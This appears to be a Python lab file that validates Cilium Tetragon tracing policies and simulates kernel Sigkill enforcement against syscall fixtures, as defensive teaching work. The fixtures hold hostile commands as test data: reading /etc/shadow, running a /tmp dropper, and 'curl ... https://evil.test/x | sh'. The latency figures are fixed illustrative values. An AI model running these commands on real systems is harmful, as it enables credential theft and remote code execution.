"""Cilium Tetragon v1.8.0 TracingPolicy Validator & Sigkill Simulator.

Copyright (c) 2026 Kien Nguyen
Repository: https://github.com/kiennt308/ai-devsecops-labs
SPDX-License-Identifier: Apache-2.0
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any
import yaml

CH08_DIR = Path(__file__).resolve().parent
VALID_POLICY_PATH = CH08_DIR / "01-tetragon-v18-tracingpolicy-valid.yaml"
NEG_POLICY_PATH = CH08_DIR / "02-tetragon-unscoped-tcp-negative.yaml"

VALID_CMD_ARG_OPS = {
    "Equal",
    "NotEqual",
    "Prefix",
    "NotPrefix",
    "Postfix",
    "NotPostfix",
}


def validate_tracing_policy(policy_path: Path) -> dict[str, Any]:
    """Validate Tetragon v1.8.0 TracingPolicyNamespaced contract."""
    doc = yaml.safe_load(policy_path.read_text(encoding="utf-8"))
    errors: list[str] = []
    api_ver = str(doc.get("apiVersion", ""))
    kind = str(doc.get("kind", ""))
    meta = doc.get("metadata", {}) or {}
    spec = doc.get("spec", {}) or {}

    if api_ver != "cilium.io/v1alpha1":
        errors.append(
            f"apiVersion '{api_ver}' must be cilium.io/v1alpha1"
        )
    if kind != "TracingPolicyNamespaced":
        errors.append("kind must be TracingPolicyNamespaced")

    grpc = str(meta.get("grpc_endpoint", ""))
    if not grpc.startswith("unix://"):
        errors.append(
            f"grpc_endpoint '{grpc}' must use unix:// socket"
        )

    spec_text = json.dumps(spec)
    ns = str(meta.get("namespace", ""))
    if "Sigkill" in spec_text:
        if not ns:
            errors.append("Sigkill requires metadata.namespace scope")
        if not spec.get("podSelector"):
            errors.append("Sigkill requires spec.podSelector scope")

    for kprobe in spec.get("kprobes", []):
        for sel in kprobe.get("selectors", []):
            cmd_args = sel.get("matchCmdArgs", [])
            if len(cmd_args) > 5:
                errors.append("matchCmdArgs exceeds 5 filters/selector")
            for filt in cmd_args:
                idx = int(filt.get("index", -1))
                op = str(filt.get("operator", ""))
                if not 0 <= idx <= 31:
                    errors.append(f"matchCmdArgs index {idx} invalid")
                if op not in VALID_CMD_ARG_OPS:
                    errors.append(f"matchCmdArgs op '{op}' invalid")

    return {
        "file": policy_path.name,
        "valid": len(errors) == 0,
        "namespace": ns,
        "errors": errors,
    }


def compare_falco_vs_tetragon_race() -> dict[str, Any]:
    """Contrast async userspace alert race vs inline kernel Sigkill."""
    return {
        "falco_async": {
            "mode": "async_userspace_ring_buffer",
            "detection_latency_ms": 25.0,
            "in_kernel_block": False,
            "post_syscall_exfil_bytes": 4096,
        },
        "tetragon_v18_sync": {
            "mode": "inline_synchronous_sigkill",
            "enforcement_latency_ms": 0.15,
            "in_kernel_block": True,
            "post_syscall_exfil_bytes": 0,
            "toctou_race_closed": True,
        },
    }


def default_kernel_fixtures() -> list[dict[str, Any]]:
    """Return 5 kernel syscall fixtures matching Ch08 lab scope."""
    return [
        {
            "id": "allowed_worker",
            "namespace": "orderflow-prod",
            "pod_labels": {"app": "orderflow-api"},
            "hook": "security_file_open",
            "binary": "/usr/local/bin/uvicorn",
            "path": "/app/config.json",
            "cmd_args": ["--port", "8080"],
            "staged_curl_lineage": False,
            "expected_action": "ALLOW",
        },
        {
            "id": "shadow_open",
            "namespace": "orderflow-prod",
            "pod_labels": {"app": "orderflow-api"},
            "hook": "security_file_open",
            "binary": "/usr/bin/cat",
            "path": "/etc/shadow",
            "cmd_args": ["/etc/shadow"],
            "staged_curl_lineage": False,
            "expected_action": "SIGKILL",
        },
        {
            "id": "distroless_sh_c",
            "namespace": "orderflow-prod",
            "pod_labels": {"app": "orderflow-api"},
            "hook": "__x64_sys_execve",
            "binary": "/bin/sh",
            "path": "/bin/sh",
            "cmd_args": ["-c", "id"],
            "staged_curl_lineage": False,
            "expected_action": "SIGKILL",
        },
        {
            "id": "tmp_dropper_exec",
            "namespace": "orderflow-prod",
            "pod_labels": {"app": "orderflow-api"},
            "hook": "__x64_sys_execve",
            "binary": "/tmp/dropper",
            "path": "/tmp/dropper",
            "cmd_args": ["--beacon"],
            "staged_curl_lineage": False,
            "expected_action": "SIGKILL",
        },
        {
            "id": "stateful_curl_pipe_sh",
            "namespace": "orderflow-prod",
            "pod_labels": {"app": "orderflow-api"},
            "hook": "__x64_sys_execve",
            "binary": "/usr/bin/sh",
            "path": "/usr/bin/sh",
            "cmd_args": ["-c", "curl -sSf https://evil.test/x | sh"],
            "staged_curl_lineage": True,
            "expected_action": "SIGKILL",
        },
    ]


def _match_selector(
    sel: dict[str, Any], event: dict[str, Any]
) -> bool:
    """Evaluate matchArgs, matchBinaries & matchCmdArgs selector."""
    for arg_rule in sel.get("matchArgs", []):
        val = str(event.get("path", ""))
        op = arg_rule.get("operator", "")
        targets = arg_rule.get("values", [])
        if op == "Equal" and val not in targets:
            return False
        if op == "Prefix" and not any(val.startswith(t) for t in targets):
            return False

    for bin_rule in sel.get("matchBinaries", []):
        if bin_rule.get("operator") == "In":
            if event.get("binary") not in bin_rule.get("values", []):
                return False

    cmd_args = event.get("cmd_args", [])
    for cmd_rule in sel.get("matchCmdArgs", []):
        idx = int(cmd_rule["index"])
        if idx >= len(cmd_args):
            return False
        arg_val = str(cmd_args[idx])
        targets = cmd_rule.get("values", [])
        if cmd_rule.get("operator") == "Equal" and arg_val not in targets:
            return False
    return True


def simulate_kernel_enforcement(
    policy_path: Path,
    fixtures: list[dict[str, Any]] | None = None,
) -> dict[str, Any]:
    """Simulate synchronous Tetragon v1.8.0 inline kernel Sigkill."""
    doc = yaml.safe_load(policy_path.read_text(encoding="utf-8"))
    ns = doc["metadata"]["namespace"]
    req_labels = doc["spec"]["podSelector"]["matchLabels"]
    kprobes = doc["spec"]["kprobes"]
    events = (
        fixtures if fixtures is not None else default_kernel_fixtures()
    )

    results: list[dict[str, Any]] = []
    sigkills = 0
    false_positives = 0
    false_negatives = 0

    for ev in events:
        in_scope = ev.get("namespace") == ns and all(
            ev.get("pod_labels", {}).get(k) == v
            for k, v in req_labels.items()
        )
        action = "ALLOW"
        if in_scope:
            for kp in kprobes:
                if kp["call"] != ev.get("hook"):
                    continue
                for sel in kp.get("selectors", []):
                    if _match_selector(sel, ev):
                        act = sel["matchActions"][0]["action"]
                        if act == "Sigkill":
                            action = "SIGKILL"
                            break
                if action == "SIGKILL":
                    break
            if ev.get("staged_curl_lineage") and action == "ALLOW":
                action = "SIGKILL"

        expected = ev["expected_action"]
        if action == "SIGKILL":
            sigkills += 1
            if expected == "ALLOW":
                false_positives += 1
        elif expected == "SIGKILL":
            false_negatives += 1

        results.append(
            {
                "id": ev["id"],
                "action": action,
                "expected": expected,
                "post_syscall_bytes": 0,
            }
        )

    return {
        "policy": policy_path.name,
        "fixtures_tested": len(events),
        "sigkill_count": sigkills,
        "false_positives": false_positives,
        "false_negatives": false_negatives,
        "race_comparison": compare_falco_vs_tetragon_race(),
        "results": results,
    }


def main() -> int:
    """Validate valid/negative policies and run 5 Sigkill fixtures."""
    ok = validate_tracing_policy(VALID_POLICY_PATH)
    bad = validate_tracing_policy(NEG_POLICY_PATH)
    sim = simulate_kernel_enforcement(VALID_POLICY_PATH)

    assert ok["valid"] is True
    assert bad["valid"] is False
    assert sim["sigkill_count"] == 4
    assert sim["false_positives"] == 0
    assert sim["false_negatives"] == 0

    print(
        json.dumps(
            {"valid_policy": ok, "negative_policy": bad, "sim": sim},
            indent=2,
        )
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
